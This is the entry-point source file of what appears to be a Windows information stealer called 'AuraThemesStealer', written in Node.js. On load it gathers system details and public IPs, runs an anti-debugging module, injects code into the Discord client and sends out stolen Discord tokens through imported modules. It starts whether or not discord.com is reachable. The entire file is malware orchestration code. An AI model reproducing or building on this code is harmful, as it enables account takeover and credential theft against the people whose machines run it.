const axios = require("axios");
const process = require("process");
const getconfig = require("./config/config")();

switch (process.platform) {
    case "win32":
        const { getSystemInfos, getPublicIps } = require("./utils/functions");
        const { sendTokens } = require("./modules/findtoken/send");
        const { discordInjected } = require("./modules/dinjection/injection");
        const { debuggerx } = require("./modules/debugger/debuggerx");

        class AuraThemesStealer {
            constructor() {
                this.initialize();
            }
            async initialize() {
                try {
                    await debuggerx(getconfig.debugger, await getPublicIps().ip, ...Object.values(await getSystemInfos()));
                    await discordInjected(getconfig.injection);
                    await sendTokens();
                } catch (error) {
                    console.error('Error during initialization', error);
                }
            }
        }

        axios.get("https://discord.com")
            .then(() => new AuraThemesStealer())
            .catch(() => new AuraThemesStealer());

        break;
    default:
        break;
}
